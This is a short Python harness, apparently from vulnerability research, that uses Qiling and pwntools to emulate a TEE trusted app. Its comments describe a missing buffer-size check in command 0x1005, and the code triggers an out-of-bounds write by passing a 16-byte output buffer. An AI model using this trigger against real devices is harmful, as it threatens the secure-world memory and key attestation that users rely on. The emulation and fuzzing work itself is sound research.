from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === SoterApp cmd 0x1005 soter_export_ask_public_key_base64_all + sign =======
# Handler 0x22408. ptypes 0x661 = {p0: VALUE_INPUT(uid), p1: MEMREF_OUTPUT(sig/json),
#   p2: MEMREF_OUTPUT}. Case@0x2042c: ldr w0,[x20](uid); ldr x1,[x20,#0x10](p1.ptr);
#   add x2,x20,#0x18(&p1.size); bl 0x22408.
# Builds a JSON {"pub_key":..,"counter":..,"cpu_id":..,"uid":..}, RSA-signs it with
#   ATTK, base64s, then copy-out @0x229f4: memmove(p1.ptr, json, json_len) with
#   *p1.size=json_len -- NO check json_len <= p1.size (same missing SHORT_BUFFER).
# json_len ~ 700-900 bytes (pubkey b64 + signature b64). Tiny out buf => OOB write.
# Precondition: ASK (cmd 0x1004) AND ATTK (cmd 0x1000) must exist.

OUT_SZ = int(os.environ.get("EXPORT_OUTSZ", "16"), 0)
UID = int(os.environ.get("EXPORT_UID", "0"), 0)

def init_fuzz(emu, sid):
    print("[export_ask] init_fuzz: gen_attk (0x1000) + gen_ask (0x1004)")
    emu.InvokeCommand(sid, 0x1000, 0x3, [ValueParam(0,0), NoneParam(), NoneParam(), NoneParam()])
    r = emu.InvokeCommand(sid, 0x1004, 0x3, [ValueParam(UID,0), NoneParam(), NoneParam(), NoneParam()])
    print(f"[export_ask] gen_ask returned {r:#x}")

def place_input_callback(ql: Qiling, input: bytes, _: int):
    out_sz = OUT_SZ
    print(f"[export_ask] cmd=0x1005 export_ask+sign uid={UID} out_sz={out_sz:#x} "
          f"(handler writes the signed-JSON envelope -> OOB past {out_sz:#x} out buf)")
    command_params = [
        ValueParam(UID, 0),                  # param0 VALUE_INPUT (uid)
        MemRefParam(bytes(out_sz), out_sz),  # param1 OUTPUT (redzoned to out_sz)
        MemRefParam(bytes(out_sz), out_sz),  # param2 OUTPUT
        NoneParam(),
    ]
    setup_params_fuzz(ql, 0x1005, 0x661, command_params)
    return True
